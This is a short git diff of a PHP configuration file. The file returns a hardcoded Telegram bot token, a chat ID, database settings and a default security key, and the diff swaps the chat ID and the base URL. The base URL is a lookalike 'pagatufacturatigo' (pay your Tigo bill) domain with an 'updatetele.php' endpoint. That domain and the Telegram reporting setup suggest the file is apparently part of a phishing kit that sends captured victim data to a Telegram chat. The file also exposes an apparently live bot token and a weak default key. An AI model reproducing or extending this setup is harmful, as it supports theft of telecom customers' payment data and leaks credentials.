@@ -27,13 +27,13 @@ else {
 
 return [
     'botToken' => getenv('BOT_TOKEN') ?: '8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ',
-    'chatId' => getenv('CHAT_ID') ?: '-5209531474',
+    'chatId' => getenv('CHAT_ID') ?: '-5187261721',
     'db_host' => $db_host,
     'db_user' => $db_user,
     'db_pass' => $db_pass,
     'db_name' => $db_name,
     'db_port' => $db_port,
-    'baseUrl' => getenv('BASE_URL') ?: 'https://pagafacturatigo-edkj.onrender.com/updatetele.php',
+    'baseUrl' => getenv('BASE_URL') ?: 'https://pagatufacturatigo.vercel.app/updatetele.php',
     'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123'
 ];
 ?>
